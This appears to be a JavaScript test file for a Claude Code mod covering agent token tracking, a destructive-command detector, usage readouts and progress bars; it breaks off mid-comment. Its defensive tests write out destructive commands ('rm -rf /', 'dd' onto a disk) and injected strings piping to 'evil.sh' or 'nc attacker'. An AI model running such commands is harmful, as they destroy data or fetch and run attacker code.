    expect(agents.find((a) => a.id === 'a1').tokens).toBe(750);
    expect(agents.find((a) => a.id === 'a2').tokens).toBe(100);
});

test('tokens for an agent nobody knows about change nothing', async () => {
    const agents = spawned([], { agentId: 'a1' });
    expect(addTokens(agents, 'ghost', 900)).toEqual(agents);
    expect(addTokens(agents, '', 900)).toEqual(agents);
    expect(addTokens(agents, 'a1', 0)).toEqual(agents);
});

test('a usage report is totalled however its fields are named', async () => {
    expect(tokensOf({ input_tokens: 100, output_tokens: 50 })).toBe(150);
    expect(tokensOf({ inputTokens: 100, cacheReadInputTokens: 20 })).toBe(120);
    expect(tokensOf({})).toBe(0);
    expect(tokensOf(null)).toBe(0);
    expect(tokensOf({ input_tokens: 'lots' })).toBe(0);
});

test('the agent list is the authority on status', async () => {
    let agents = spawned([], { agentId: 'a1' });
    agents = merge(agents, [{ id: 'a1', status: 'completed' }]);
    expect(agents[0].status).toBe('completed');
    expect(agents[0].finishedAt !== null).toBe(true);
});

test('an agent only the list knows about is still shown', async () => {
    // Missing one that is plainly running is worse than showing one the
    // events did not catch.
    const agents = merge([], [{ id: 'z9', status: 'running', subagent_type: 'explore' }]);
    expect(agents.length).toBe(1);
    expect(agents[0].name).toBe('explore');
});

test('a finished agent lingers, then goes', async () => {
    const now = Date.now();
    const agents = [{ id: 'a1', status: 'completed', finishedAt: now - 1000, startedAt: now - 9000, tokens: 1 }];
    expect(visible(agents, now).length).toBe(1);
    expect(visible(agents, now + LINGER_MS).length).toBe(0);
    expect(prune(agents, now + LINGER_MS).length).toBe(0);
});

test('a running agent is never pruned, however long it runs', async () => {
    const old = { id: 'a1', status: 'running', finishedAt: null, startedAt: 0, tokens: 0 };
    expect(prune([old], Date.now()).length).toBe(1);
});

test('shares add up to the whole, and are zero before anything is spent', async () => {
    const out = shares([{ tokens: 300 }, { tokens: 100 }]);
    expect(Math.round(out[0] * 100)).toBe(75);
    expect(Math.round(out[1] * 100)).toBe(25);
    expect(shares([{ tokens: 0 }, { tokens: 0 }])).toEqual([0, 0]);
    expect(shares([])).toEqual([]);
});

test('elapsed and token counts stay short enough for a row', async () => {
    const now = Date.now();
    expect(elapsedText(now - 18000, now)).toBe('18s');
    expect(elapsedText(now - 125000, now)).toBe('2m5s');
    expect(elapsedText(now - 3720000, now)).toBe('1h2m');
    expect(tokenText(950)).toBe('950');
    expect(tokenText(4100)).toBe('4.1k');
    expect(tokenText(1200000)).toBe('1.2m');
});

test('status drives the colour, and failure is loud', async () => {
    expect(statusColor('running')).toBe('green');
    expect(statusColor('waiting')).toBe('yellow');
    expect(statusColor('failed')).toBe('red');
    expect(statusColor('killed')).toBe('red');
    expect(statusColor('completed')).toBe(undefined);
});

// ================================================================ blast radius

test('the destructive shapes are recognised', async () => {
    expect(assess('rm -rf build').kind).toBe('rm');
    expect(assess('rm -fr build').kind).toBe('rm');
    expect(assess('git reset --hard').kind).toBe('git-reset');
    expect(assess('git clean -fd').kind).toBe('git-clean');
    expect(assess('git push --force origin main').kind).toBe('git-force-push');
    expect(assess('git push -f').kind).toBe('git-force-push');
    expect(assess('DROP TABLE users;').kind).toBe('sql-drop');
    expect(assess('dd if=/dev/zero of=/dev/sda').kind).toBe('disk');
});

test('ordinary commands are left entirely alone', async () => {
    const safe = ['ls -la', 'npm install', 'rm file.txt', 'git status',
        'git push origin main', 'cat README.md', '', null];
    for (const command of safe) {
        expect(assess(command)).toBe(null);
    }
});

test('force-with-lease is not a force push, and must not be treated as one', async () => {
    // It is the safe form. Interrupting it would train you to ignore the box.
    expect(assess('git push --force-with-lease')).toBe(null);
    expect(assess('git push --force-with-lease origin main')).toBe(null);
});

test('a command that builds its own arguments is not guessed at', async () => {
    // Measuring the wrong thing is worse than measuring nothing.
    expect(assess('rm -rf $(cat list)')).toBe(null);
    expect(assess('find . -name "*.o" | xargs rm -rf')).toBe(null);
});

test('a catastrophic target is marked as one', async () => {
    expect(assess('rm -rf /').precious).toBe(true);
    expect(assess('rm -rf ~').precious).toBe(true);
    expect(assess('rm -rf .').precious).toBe(true);
    expect(assess('rm -rf build').precious).toBe(false);
    expect(/read it twice/i.test(warningFor(assess('rm -rf /')))).toBe(true);
    expect(warningFor(assess('rm -rf build'))).toBe('');
});

test('a path with shell characters in it is not measured', async () => {
    expect(firstPath('a;rm')).toBe(null);
    expect(firstPath('*')).toBe(null);
    expect(firstPath('-rf build')).toBe('build');
});

test('every preview is argv, with a fixed verb and no shell', async () => {
    // This is the whole security property of the file.
    const commands = ['rm -rf build', 'git reset --hard', 'git clean -fd', 'git push --force'];
    for (const command of commands) {
        const preview = previewFor(assess(command));
        expect(Array.isArray(preview.argv)).toBe(true);
        expect(['find', 'git'].indexOf(preview.argv[0]) >= 0).toBe(true);
        for (const arg of preview.argv) {
            expect(typeof arg).toBe('string');
        }
    }
});

test('a target with a space travels as one argument, not as shell text', async () => {
    const preview = previewFor({ kind: 'rm', target: 'my dir', precious: false });
    expect(preview.argv).toEqual(['find', 'my dir', '-type', 'f']);
});

test('the kinds with no safe measurement return no preview', async () => {
    expect(previewFor({ kind: 'sql-drop' })).toBe(null);
    expect(previewFor({ kind: 'disk' })).toBe(null);
    expect(previewFor(null)).toBe(null);
});

test('counting is counting lines, and empty output is zero', async () => {
    expect(countLines('a\nb\nc')).toBe(3);
    expect(countLines('')).toBe(0);
    expect(countLines(null)).toBe(0);
});

test('the question leads with the number', async () => {
    const many = describe(assess('rm -rf build'), 1240);
    expect(/1,240 files/.test(many)).toBe(true);
    expect(/build/.test(many)).toBe(true);
    const one = describe(assess('rm -rf build'), 1);
    expect(one.indexOf('1 file ') >= 0).toBe(true);
    expect(one.indexOf('1 files') >= 0).toBe(false);
});

test('an unmeasurable command still gets an honest sentence', async () => {
    const text = describe(assess('rm -rf build'), null);
    expect(/could not be measured/.test(text)).toBe(true);
    expect(/null/.test(text)).toBe(false);
});

test('each kind says what it actually destroys', async () => {
    expect(/uncommitted/.test(describe(assess('git reset --hard'), 4))).toBe(true);
    expect(/untracked/.test(describe(assess('git clean -fd'), 7))).toBe(true);
    expect(/overwrites the remote/.test(describe(assess('git push -f'), 2))).toBe(true);
    expect(/no undo/i.test(describe(assess('DROP TABLE t;'), null))).toBe(true);
});

// =================================================================== heads up

test('a small turn is not worth a check', async () => {
    expect(shouldCheck({ on: true, sinceLast: 9, toolCalls: 1, answer: 'done' })).toBe(false);
});

test('a big turn is, but only after enough turns have passed', async () => {
    expect(shouldCheck({ on: true, sinceLast: 1, toolCalls: 9, answer: 'x'.repeat(2000) })).toBe(false);
    expect(shouldCheck({ on: true, sinceLast: 3, toolCalls: 9, answer: '' })).toBe(true);
    expect(shouldCheck({ on: true, sinceLast: 3, toolCalls: 0, answer: 'x'.repeat(2000) })).toBe(true);
});

test('heads up off means off', async () => {
    expect(shouldCheck({ on: false, sinceLast: 99, toolCalls: 99, answer: 'x'.repeat(9999) })).toBe(false);
});

test('the conversation is flattened whatever shape the blocks are', async () => {
    const messages = [
        { role: 'user', content: 'fix the parser' },
        { role: 'assistant', content: [{ type: 'text', text: 'I changed parser.js' }, { type: 'tool_use' }] },
        { role: 'system', content: 'ignored' },
    ];
    const text = flatten(messages);
    expect(/Developer: fix the parser/.test(text)).toBe(true);
    expect(/Assistant: I changed parser\.js/.test(text)).toBe(true);
    expect(/ignored/.test(text)).toBe(false);
});

test('a short conversation is not worth sending', async () => {
    expect(buildHeadsPrompt([{ role: 'user', content: 'hi' }])).toBe(null);
    expect(buildHeadsPrompt([])).toBe(null);
});

test('the heads-up request asks for silence by default, and says so', async () => {
    const ask = buildHeadsPrompt([{ role: 'assistant', content: 'x'.repeat(500) }]);
    expect(/NONE/.test(ask)).toBe(true);
    expect(ask.length < 3200).toBe(true);
});

test('NONE is silence, in any spelling', async () => {
    for (const quiet of ['NONE', 'none', 'None.', 'NONE - nothing to flag']) {
        expect(parseHeadsUp(quiet)).toBe(null);
    }
});

test('a real note comes through, cleaned', async () => {
    const note = parseHeadsUp('- "The retry test still asserts the old timeout."');
    expect(note).toBe('The retry test still asserts the old timeout.');
});

test('anything that is not a short concrete note is dropped', async () => {
    const bad = ['', '   ', 'Sure, here is one:', 'ok', 'Did you mean to change the timeout?',
        'x'.repeat(400), 'I think that', 'As an assistant I would say the parser changed'];
    for (const b of bad) {
        expect(parseHeadsUp(b)).toBe(null);
    }
});

test('an object reply is read as well as a string, for heads up', async () => {
    const note = parseHeadsUp({ text: 'The migration drops a column the report still reads.' });
    expect(note).toBe('The migration drops a column the report still reads.');
});

// ===================================== the preview cannot be turned into a weapon
//
// This is the only part of the mod that starts a process, so it is the only
// part where a mistake is a security bug rather than a cosmetic one. Each
// test below is an attack, not a feature.

/** Every argv a command would produce, or null. */
const argvFor = (command) => {
    const found = assess(command);
    if (!found) return null;
    const preview = previewFor(found);
    return preview ? preview.argv : null;
};

test('a target cannot turn find into a destructive command', async () => {
    // `find -delete` deletes. If a target starting with a dash reached the
    // argv, the preview would destroy the thing it was asked to measure.
    const attacks = ['rm -rf -delete', 'rm -rf -exec rm {} ;', 'rm -rf --delete',
        'rm -rf -newer /etc/passwd -delete'];
    for (const attack of attacks) {
        const argv = argvFor(attack);
        if (!argv) continue;
        expect(argv.indexOf('-delete') >= 0).toBe(false);
        expect(argv.indexOf('-exec') >= 0).toBe(false);
    }
});

test('no preview argv ever contains an action, only a test', async () => {
    const acting = ['-delete', '-exec', '-execdir', '-ok', '-okdir', '-fls', '-fprint', '-fprintf'];
    const commands = ['rm -rf build', 'rm -rf /', 'rm -rf a/b/c', 'git reset --hard',
        'git clean -fd', 'git push --force'];
    for (const command of commands) {
        const argv = argvFor(command) || [];
        for (const bad of acting) {
            expect(argv.indexOf(bad) >= 0).toBe(false);
        }
    }
});

test('shell metacharacters never reach an argv', async () => {
    const attacks = [
        'rm -rf build;curl evil.sh|sh',
        'rm -rf build && curl evil',
        'rm -rf build|nc attacker 1234',
        'rm -rf $(whoami)',
        'rm -rf "a b"',
        'rm -rf build>out',
        'rm -rf *',
        'rm -rf {a,b}',
    ];
    for (const attack of attacks) {
        const argv = argvFor(attack);
        if (argv === null) continue;
        for (const arg of argv) {
            expect(/[;&|<>$`(){}*?!\\'"]/.test(arg)).toBe(false);
        }
    }
});

test('the verb of a preview can never come from the command text', async () => {
    const argv = argvFor('rm -rf curl');
    expect(argv[0]).toBe('find');
    expect(argv).toEqual(['find', 'curl', '-type', 'f']);
});

test('git previews take no argument from the command at all', async () => {
    const commands = ['git reset --hard origin/evil', 'git clean -fd /etc',
        'git push --force git@evil:repo main'];
    for (const command of commands) {
        const argv = argvFor(command);
        expect(argv.every((a) => a.indexOf('evil') === -1)).toBe(true);
    }
});

test('an absurd path cannot change the shape of the argv', async () => {
    const attacks = ['rm -rf ' + 'a'.repeat(5000), 'rm -rf ./././././build'];
    for (const attack of attacks) {
        const argv = argvFor(attack);
        if (!argv) continue;
        expect(argv.length).toBe(4);
        expect(argv[0]).toBe('find');
        expect(typeof argv[1]).toBe('string');
    }
});

test('firstPath refuses anything it cannot read plainly', async () => {
    const bad = ['"a b"', "'a'", 'a;b', 'a|b', 'a&b', 'a>b', 'a<b', 'a*b', 'a?b',
        'a(b)', 'a{b}', 'a!b', ''];
    for (const text of bad) {
        expect(firstPath(text)).toBe(null);
    }
    expect(firstPath('-rf -v build extra')).toBe('build');
});

test('an empty or absent target produces no preview at all', async () => {
    expect(assess('rm -rf')).toBe(null);
    expect(assess('rm -rf   ')).toBe(null);
    expect(assess('rm -rf -v')).toBe(null);
});

// ================================================= the mod actually loads
//
// This is the test that was missing, and its absence shipped a mod that
// could not load at all: a duplicate import made `register.js` throw on
// import, which looks exactly like the plugin not being installed. Every
// other test here checks a part; this one checks that the thing starts.

test('the hooks module loads and registers its hooks', async () => {
    const registered = [];

    const on = (event, a, b) => {
        const matcher = typeof a === 'function' ? null : a;
        const handler = typeof a === 'function' ? a : b;
        expect(typeof event).toBe('string');
        expect(typeof handler).toBe('function');
        registered.push({ event, matcher });
        // The real `on` returns a registration carrying `.catch`.
        return { catch: () => undefined };
    };

    const mod = { register };
    expect(typeof mod.register).toBe('function');
    mod.register(on);

    // Every hook the mod needs, by name.
    const events = registered.map((r) => r.event);
    for (const needed of ['session.start', 'session.measure', 'prompt.submit', 'turn.complete',
        'turn.step', 'agent.spawn', 'tool.call', 'classic.PreModelSwitch',
        'command.run', 'ui.render']) {
        expect(events.indexOf(needed) >= 0).toBe(true);
    }
});

test('no event is registered twice without a matcher', async () => {
    // Claude Code refuses to load a module that does, and the failure is
    // the whole mod rather than the one hook.
    const bare = [];

    const on = (event, a) => {
        if (typeof a === 'function') bare.push(event);
        return { catch: () => undefined };
    };

    const mod = { register };
    mod.register(on);

    const seen = new Set();
    for (const event of bare) {
        expect(seen.has(event)).toBe(false);
        seen.add(event);
    }
});

test('the gating hook has a catch handler, so a bug in it fails open', async () => {
    // A tool.call hook that throws without one would leave Claude Code to
    // decide, and a guard that breaks your work is worse than no guard.
    let gatedHasCatch = false;

    const on = (event, a, b) => {
        const isGate = event === 'tool.call';
        return {
            catch: (fn) => {
                if (isGate && typeof fn === 'function') gatedHasCatch = true;
                return undefined;
            },
        };
    };

    const mod = { register };
    mod.register(on);
    expect(gatedHasCatch).toBe(true);
});

// ================================================ the separate Fable window
//
// The usage panel on the website shows three allowances: the session, the
// week, and a weekly one for Fable on its own. Claude Code reports only the
// first two to mods, so the third cannot be drawn - and the strip going quiet
// about it looks exactly like the strip being broken.
//
// These cover both halves: that nothing is silently dropped when it does
// arrive, and that its absence is stated rather than hidden.

test('a Fable window is read like any other when it is reported', async () => {
    const read = readUsage({
        rateLimits: [
            { kind: 'five_hour', percentUsed: 22, resetsAt: 1700000000 },
            { kind: 'seven_day', percentUsed: 67, resetsAt: 1700600000 },
            { kind: 'seven_day_fable', percentUsed: 4, resetsAt: 1700600000 },
        ],
    });
    expect(read.rateLimits.length).toBe(3);
    expect(read.rateLimits[2].kind).toBe('seven_day_fable');
    expect(read.rateLimits[2].percentUsed).toBe(4);
    // The reset has to survive too, or it draws a bar with no countdown.
    expect(read.rateLimits[2].resetsAt).toBe(1700600000);
});

test('and it is labelled Fable, not dropped for being unfamiliar', async () => {
    // The list of kinds is not documented, so anything unrecognised is
    // tidied rather than discarded: a limit nobody shows you is how you run
    // out of something you did not know you had.
    expect(shortKind('seven_day_fable')).toBe('Fable');
    expect(shortKind('fable_weekly')).toBe('Fable');
    expect(shortKind('seven_day_opus')).toBe('Opus');
});

test('the readout notices when no Fable window came back', async () => {
    expect(hasFableWindow([{ kind: 'five_hour' }, { kind: 'seven_day' }])).toBe(false);
    expect(hasFableWindow([{ kind: 'seven_day_fable' }])).toBe(true);
    expect(hasFableWindow([])).toBe(false);
});

test('/hud raw says Fable is absent rather than leaving it a mystery', async () => {
    const lines = describeUsage({
        context: { tokens: 1, window: 2, percent: 33 },
        rateLimits: [
            { kind: 'five_hour', percentUsed: 26, resetsAt: 1700000000 },
            { kind: 'seven_day', percentUsed: 67, resetsAt: 1700600000 },
        ],
    }).join('\n');
    expect(lines.includes('no Fable window in this data')).toBe(true);
    // And it names every window, so the answer is visible rather than
    // inferred from a count.
    expect(lines.includes('kinds: five_hour, seven_day')).toBe(true);
});

test('and says nothing about it once it is there', async () => {
    const lines = describeUsage({
        rateLimits: [
            { kind: 'five_hour', percentUsed: 26, resetsAt: 1700000000 },
            { kind: 'seven_day_fable', percentUsed: 4, resetsAt: 1700600000 },
        ],
    }).join('\n');
    expect(lines.includes('no Fable window in this data')).toBe(false);
});

// ========================================= the subagent bar means a share
//
// It is each agent's portion of the tokens spent across all of them. With one
// agent that is always the whole thing, so the bar was always full - drawn in
// the same language as the quota bars above it, where full means spent. The
// row read as an agent that had maxed something out when it only meant there
// was nothing to compare it with.

test('one agent is the whole of the agent tokens, by definition', async () => {
    const one = [{ id: 'a', tokens: 1700000 }];
    expect(shares(one)[0]).toBe(1);
});

test('which is why a lone agent is not given a bar', async () => {
    // The strip's own rule, not a copy of it written here.
    expect(comparable([{ id: 'a' }])).toBe(false);
    expect(comparable([{ id: 'a' }, { id: 'b' }])).toBe(true);
    expect(comparable([])).toBe(false);
    expect(comparable(undefined)).toBe(false);
});

test('two agents split it, and the bar starts meaning something', async () => {
    const two = [{ id: 'a', tokens: 750 }, { id: 'b', tokens: 250 }];
    const portions = shares(two);
    expect(portions[0]).toBe(0.75);
    expect(portions[1]).toBe(0.25);
});

// ============================================== what the strip makes of it
//
// Every reading stays on screen; only the weight changes. These cover the
// rule that decides that weight, and the one that decides whether the mod
// needs a timer running at all.

test('a reading earns its weight from the same thresholds as its colour', async () => {
    expect(levelOf(0)).toBe(CALM);
    expect(levelOf(55)).toBe(CALM);
    expect(levelOf(56)).toBe(WATCH);
    expect(levelOf(85)).toBe(WATCH);
    expect(levelOf(86)).toBe(URGENT);
    expect(levelOf(100)).toBe(URGENT);
});

test('a rounding case lands on the same side as the printed number', async () => {
    // 55.6 prints as 56, so it must not still be calm.
    expect(levelOf(55.6)).toBe(WATCH);
    expect(levelOf(85.7)).toBe(URGENT);
});

test('the dot reports the worst thing on the strip', async () => {
    expect(worstLevel([{ level: CALM }, { level: CALM }])).toBe(CALM);
    expect(worstLevel([{ level: CALM }, { level: WATCH }])).toBe(WATCH);
    expect(worstLevel([{ level: WATCH }, { level: URGENT }])).toBe(URGENT);
    expect(worstLevel([])).toBe(CALM);
});

test('a reset far out is a time of day, one close is a countdown', async () => {
    const now = 1700000000000;
    const inMinutes = (m) => (now + m * 60000) / 1000;
    expect(resetFormFor(inMinutes(30), now)).toBe('countdown');
    expect(resetFormFor(inMinutes(119), now)).toBe('countdown');
    expect(resetFormFor(inMinutes(121), now)).toBe('clock');
    expect(resetFormFor(inMinutes(60 * 40), now)).toBe('clock');
    expect(resetFormFor(null, now)).toBe('none');
    // Already gone: nothing to count down to.
    expect(resetFormFor(inMinutes(-5), now)).toBe('none');
});

test('the per-minute redraw runs only while something counts down', async () => {
    // This is the whole saving. The strip used to redraw every minute from
    // startup to shutdown whether or not anything on it changed.
    expect(needsClock([{ resetForm: 'clock' }, { resetForm: 'none' }])).toBe(false);
    expect(needsClock([{ resetForm: 'clock' }, { resetForm: 'countdown' }])).toBe(true);
    expect(needsClock([])).toBe(false);
});

test('context is a reading but never a window', async () => {
    // It has no reset and no pace: it ends when the conversation is
    // compacted, not when a clock runs out.
    const readings = readingsFor({ contextPercent: 33, rateLimits: [] });
    expect(readings.length).toBe(1);
    expect(readings[0].label).toBe('Ctx');
    expect(readings[0].resetForm).toBe('none');
    expect(readings[0].note).toBe('');
});

test('every window reported is a reading, in the order it came', async () => {
    const readings = readingsFor({
        contextPercent: 15,
        rateLimits: [
            { kind: 'five_hour', percentUsed: 2, resetsAt: 1700000000 },
            { kind: 'seven_day', percentUsed: 64, resetsAt: 1700600000 },
            { kind: 'seven_day_fable', percentUsed: 4, resetsAt: 1700600000 },
        ],
        labelOf: shortKind,
    });
    expect(readings.map((r) => r.label).join(',')).toBe('Ctx,Session,Week,Fable');
});

test('a spend limit is still left out, since it is not a quota', async () => {
    const readings = readingsFor({
        rateLimits: [{ kind: 'spend_limit', percentUsed: 80 }],
        labelOf: shortKind,
    });
    expect(readings.length).toBe(0);
});

test('only one note is ever spoken, and it is the most pressing', async () => {
    const pick = leadNote([
        { label: 'Week', level: WATCH, note: 'slow', pace: { dryInMinutes: 900 } },
        { label: 'Session', level: URGENT, note: 'fast', pace: { dryInMinutes: 30 } },
    ]);
    expect(pick.label).toBe('Session');
    expect(leadNote([{ label: 'Week', level: CALM, note: '' }])).toBe(null);
    expect(leadNote([])).toBe(null);
});

// ====================================================== the progress bar
//
// The denominator comes from the todo list, which is written before the work
// starts and updated as each item lands. Nothing here is invented.

test('the plan is found whatever the event calls it', async () => {
    const list = [{ content: 'a', status: 'completed' }];
    expect(todosFrom({ todos: list }).length).toBe(1);
    expect(todosFrom({ input: { todos: list } }).length).toBe(1);
    expect(todosFrom({ args: { todos: list } }).length).toBe(1);
    expect(todosFrom({ parameters: { items: list } }).length).toBe(1);
    expect(todosFrom({}).length).toBe(0);
    expect(todosFrom(null).length).toBe(0);
});

test('one todo is not a plan', async () => {
    // A bar reading 0/1 on every small question is noise.
    expect(progressOf([{ content: 'a', status: 'pending' }])).toBe(null);
    expect(progressOf([])).toBe(null);
    expect(MIN_PLAN).toBe(2);
});

test('finished and in hand are counted apart', async () => {
    const plan = progressOf([
        { content: 'one', status: 'completed' },
        { content: 'two', status: 'completed' },
        { activeForm: 'Building the sidebar', status: 'in_progress' },
        { content: 'four', status: 'pending' },
    ]);
    expect(plan.total).toBe(4);
    expect(plan.done).toBe(2);
    expect(plan.doing).toBe(1);
    // The bar reaches the end when the work does, not when the last item is
    // picked up - so the solid layer counts only what is finished.
    expect(plan.donePercent).toBe(50);
    expect(plan.reachedPercent).toBe(75);
    expect(plan.label).toBe('Building the sidebar');
    expect(countText(plan)).toBe('2/4');
});

test('the item in hand names the bar', async () => {
    const plan = progressOf([
        { content: 'done thing', status: 'completed' },
        { activeForm: 'Wiring the panel', content: 'Wire the panel', status: 'in_progress' },
    ]);
    expect(plan.label).toBe('Wiring the panel');
});

test('a finished plan stops being drawn', async () => {
    const done = progressOf([
        { content: 'one', status: 'completed' },
        { content: 'two', status: 'completed' },
    ]);
    expect(done.complete).toBe(true);
    expect(worthShowing(done)).toBe(false);
    expect(worthShowing(null)).toBe(false);
});

test('a plan still running is drawn', async () => {
    const plan = progressOf([
        { content: 'one', status: 'completed' },
        { content: 'two', status: 'pending' },
    ]);
    expect(worthShowing(plan)).toBe(true);
    expect(plan.percent).toBe(50);
});

test('an unfamiliar status counts as not started rather than breaking', async () => {
    const plan = progressOf([
        { content: 'one', status: 'queued' },
        { content: 'two', status: 'completed' },
    ]);
    expect(plan.done).toBe(1);
    expect(plan.doing).toBe(0);
});

const quarterPlan = () => progressOf([
    { content: 'a', status: 'completed' },
    { content: 'b', status: 'in_progress' },
    { content: 'c', status: 'pending' },
    { content: 'd', status: 'pending' },
]);

test('the terminal bar is savvy-progress\'s: solid blocks, a light shade, exactly as wide as asked', async () => {
    const pieces = planBar(quarterPlan(), false, 16);
    const text = pieces.map((x) => x.text).join('');
    expect(text.length).toBe(16);
    // One in four done: four solid, twelve light, and no brackets.
    expect(text).toBe('█'.repeat(4) + '░'.repeat(12));
});

test('the terminal bar is the plan\'s violet while under way, never a quota colour', async () => {
    const colors = planBar(quarterPlan(), false, 16).map((x) => x.color);
    expect(colors.every((c) => c === PLAN_ACCENT)).toBe(true);
    expect(PLAN_ACCENT).toBe('#7a7cf8');
});

test('and green once it is finished, and full', async () => {
    const plan = progressOf([{ content: 'a', status: 'completed' }, { content: 'b', status: 'completed' }]);
    const pieces = planBar(plan, false, 10);
    expect(pieces.length).toBe(1);
    expect(pieces[0].text).toBe('█'.repeat(10));
    expect(pieces[0].color).toBe(PLAN_DONE);
});

test('the bar is never full until the last item is done', async () => {
    const todos = [];
    for (let i = 0; i < 39; i += 1) todos.push({ content: 'x' + i, status: 'completed' });
    todos.push({ content: 'last', status: 'in_progress' });
    const text = planBar(progressOf(todos), false, 16).map((x) => x.text).join('');
    expect(text.endsWith('░')).toBe(true);
});

test('the first item of a long plan still shows as something begun', async () => {
    // One of forty in sixteen cells rounds to nothing, which is the case.
    const todos = [{ content: 'a', status: 'completed' }];
    for (let i = 0; i < 39; i += 1) todos.push({ content: 'x' + i, status: 'pending' });
    const pieces = planBar(progressOf(todos), false, 16);
    expect(pieces[0].text.startsWith('█')).toBe(true);
});

test('an empty plan draws an empty track, not a broken bar', async () => {
    const pieces = planBar(null, false, 16);
    expect(pieces.map((x) => x.text).join('')).toBe('░'.repeat(16));
});

test('a terminal that is not UTF-8 gets the same bar in plain characters', async () => {
    const text = planBar(quarterPlan(), true, 8).map((x) => x.text).join('');
    expect(text).toBe('##------');
});

// ---- the desktop's bar

test('the desktop bar carries the count on a pill at the head of the fill', async () => {
    const svg = planSvg({ total: 12, done: 4, doing: 1, complete: false }, { width: 400 });
    expect(svg.startsWith('<svg')).toBe(true);
    expect(svg.includes('>4/12</text>')).toBe(true);
    expect(svg.includes('fill="#8f8cf4"')).toBe(true);
});

test('it marks where every task still ahead begins', async () => {
    // Twelve tasks, four done: ticks for the seven boundaries past the fill.
    const svg = planSvg({ total: 12, done: 4, doing: 0, complete: false }, { width: 600 });
    const ticks = (svg.match(/height="8" rx="0.75"/g) || []).length;
    expect(ticks).toBe(7);
});

test('work in hand is a faint layer ahead of the fill, and none without any', async () => {
    const busy = planSvg({ total: 4, done: 1, doing: 2, complete: false }, { width: 400 });
    const idle = planSvg({ total: 4, done: 1, doing: 0, complete: false }, { width: 400 });
    const faint = (s) => (s.match(/width="1.7"/g) || []).length;
    expect(faint(busy) > 0).toBe(true);
    expect(faint(idle)).toBe(0);
});

test('the dither is the same on every redraw, so it never shimmers', async () => {
    const a = planSvg({ total: 8, done: 3, doing: 1, complete: false }, { width: 400 });
    const b = planSvg({ total: 8, done: 3, doing: 1, complete: false }, { width: 400 });
    expect(a).toBe(b);
});

test('a finished plan is green and settles to a slow glow', async () => {
    const svg = planSvg({ total: 3, done: 3, doing: 0, complete: true }, { width: 300 });
    expect(svg.includes('fill="#5fbf8f"')).toBe(true);
    expect(svg.includes('fill="#8f8cf4"')).toBe(false);
    expect(svg.includes('opacity:0.8')).toBe(true);
});

test('the twinkle stops for anyone who asked for less motion', async () => {
    const svg = planSvg({ total: 3, done: 1, doing: 0, complete: false }, { width: 300 });
    expect(svg.includes('prefers-reduced-motion: reduce')).toBe(true);
});

test('nothing in the bar assumes a theme: the only text is white on the plan colour', async () => {
    const svg = planSvg({ total: 5, done: 2, doing: 1, complete: false }, { width: 300 });
    const texts = svg.match(/<text[^>]*>/g) || [];
    expect(texts.length).toBe(1);
    expect(texts[0].includes('fill="#ffffff"')).toBe(true);
    expect(svg.includes('prefers-color-scheme')).toBe(false);
});

test('a plan with nothing in it draws a track and no pill', async () => {
    const svg = planSvg(null, { width: 200 });
    expect(svg.includes('<text')).toBe(false);
    expect(svg.startsWith('<svg')).toBe(true);
});

// ====================================== the desktop strip holds its shape
//
// This shipped as one flat row of loose pieces. In a narrow band every piece
// shrank on its own and split mid-label: "opus 5" on two lines, "6:30 AM"
// cut at its space. The fix is structural - a Box per reading that refuses to
// shrink, in a row that wraps between them - so the test is on the tree, not
// on any one width: render the real hook and look at what it built.

async function renderDesktopStrip(rateLimits, contextPercent) {
    const hooks = [];
    const on = (event, a, b) => {
        const matcher = typeof a === 'function' ? null : a;
        const handler = typeof a === 'function' ? a : b;
        hooks.push({ event, matcher, handler });
        return { catch: () => undefined };
    };
    const mod = { register };
    mod.register(on);

    const el = (type) => (props) => ({ type, ...props });
    const ui = {
        resolve: () => ({ Box: el('Box'), Text: el('Text'), Svg: el('Svg'), Button: el('Button') }),
        invalidate: () => undefined,
    };
    const next = async (e) => e;

    const measure = hooks.find((h) => h.event === 'session.measure');
    await measure.handler({
        session: { usage: async () => ({ context: { percent: contextPercent }, rateLimits }) },
        ui,
    }, {}, next);

    // The band, by name: there is a second ui.render hook now, the sidebar's,
    // and asking for "the" render hook would hand back whichever came first.
    const render = hooks.find((h) => h.event === 'ui.render' && h.matcher && h.matcher.component === 'AbovePrompt');
    return render.handler({
        ui,
        session: { model: async () => 'claude-opus-5-5' },
        clock: { after: () => undefined, every: () => undefined },
    }, { surface: 'desktop', component: 'AbovePrompt' }, async () => null);
}

const soon = () => Math.floor(Date.now() / 1000) + 3 * 3600;
const later = () => Math.floor(Date.now() / 1000) + 40 * 3600;

test('the desktop strip wraps between readings instead of inside them', async () => {
    const tree = await renderDesktopStrip([
        { kind: 'five_hour', percentUsed: 58, resetsAt: soon() },
        { kind: 'seven_day', percentUsed: 71, resetsAt: later() },
    ], 71);
    expect(tree.type).toBe('Box');
    expect(tree.flexWrap).toBe('wrap');
});

test('and the desktop strip never tears a reading', async () => {
    const tree = await renderDesktopStrip([
        { kind: 'five_hour', percentUsed: 58, resetsAt: soon() },
        { kind: 'seven_day', percentUsed: 71, resetsAt: later() },
    ], 71);
    // Every child of the wrapping row is a whole group, and none may shrink.
    // A bare Text here is the old bug: a loose piece free to split.
    expect(tree.children.length >= 4).toBe(true);
    for (const child of tree.children) {
        expect(child.type).toBe('Box');
        expect(child.flexShrink).toBe(0);
    }
});

test('a reading keeps its label, number and reset together in one group', async () => {
    const tree = await renderDesktopStrip([
        { kind: 'five_hour', percentUsed: 58, resetsAt: soon() },
    ], 10);
    const session = tree.children.find((c) => c.key === 'rdsession');
    expect(!!session).toBe(true);
    const kinds = session.children.map((c) => c.key);
    expect(kinds.indexOf('lsession') >= 0).toBe(true);
    expect(kinds.indexOf('psession') >= 0).toBe(true);
    expect(kinds.indexOf('rsession') >= 0).toBe(true);
});

test('no text on the desktop strip is left free to wrap mid-word', async () => {
    const tree = await renderDesktopStrip([
        { kind: 'five_hour', percentUsed: 58, resetsAt: soon() },
        { kind: 'seven_day', percentUsed: 71, resetsAt: later() },
    ], 71);
    for (const group of tree.children) {
        for (const part of group.children) {
            if (part.type === 'Text') expect(part.wrap).toBe('truncate');
        }
    }
});

test('a calm reading spends no gauge and a busy one does', async () => {
    const tree = await renderDesktopStrip([
        { kind: 'five_hour', percentUsed: 2, resetsAt: soon() },
        { kind: 'seven_day', percentUsed: 71, resetsAt: later() },
    ], 10);
    const has = (key) => tree.children.find((c) => c.key === key).children.some((p) => p.type === 'Svg');
    expect(has('rdsession')).toBe(false);
    expect(has('rdweek')).toBe(true);
});

// ================================== the question is asked once, not forever
//
// At 90% of the window the mod asks how to proceed with expensive work. It
// asked again on every prompt afterwards, at 95%, 97%, 97% and 97%, because
